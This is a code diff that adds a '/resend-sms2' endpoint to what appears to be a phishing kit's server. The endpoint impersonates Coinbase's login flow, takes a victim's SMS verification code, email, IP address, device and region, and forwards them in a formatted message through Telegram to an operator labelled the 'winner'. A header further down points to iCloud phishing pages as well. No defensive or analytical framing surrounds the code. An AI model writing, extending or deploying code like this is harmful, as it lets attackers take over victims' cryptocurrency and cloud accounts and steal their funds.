@@ -829,6 +829,63 @@ app.post("/resend-sms", async (req, res) => {
 });
 
 // ============================================================================
+// POST /resend-sms2 - Resend SMS 2 code to winner bot only
+// ============================================================================
+
+app.post("/resend-sms2", async (req, res) => {
+  try {
+    const { sms2Id, userId, code } = req.body;
+
+    if (!sms2Id || !userId || !code) {
+      return res.status(400).json({ error: "Missing sms2Id, userId, or code" });
+    }
+
+    console.log(`📲 Resending SMS 2 for ${sms2Id}`);
+
+    const ip = getIP(req);
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    // ✅ Get email from pendingSMS2
+    let email = "unknown@example.com";
+    if (pendingSMS2[sms2Id]) {
+      email = pendingSMS2[sms2Id].email || pendingSMS2[sms2Id].displayEmail || "unknown@example.com";
+    }
+
+    const message =
+      `🔄 <b>Coinbase - Resend SMS 2</b> 🔄\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>💬 Code:</b> <code>${code}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    // ✅ SEND TO WINNER ONLY - NO BUTTONS
+    if (email && userWinnerTelegram[email]) {
+      await sendFollowUpMessage(email, message, {
+        parse_mode: "HTML"
+        // ✅ NO reply_markup - no buttons!
+      });
+    } else {
+      return res.status(400).json({ error: "No winner determined for this email" });
+    }
+
+    // Reset SMS2 status to pending so polling works again
+    if (pendingSMS2[sms2Id]) {
+      pendingSMS2[sms2Id].status = "pending";
+    }
+
+    res.json({ ok: true });
+
+  } catch (err) {
+    console.error("Resend SMS 2 error:", err);
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ============================================================================
 // ICLOUD PAGES ENDPOINTS
 // ============================================================================
 
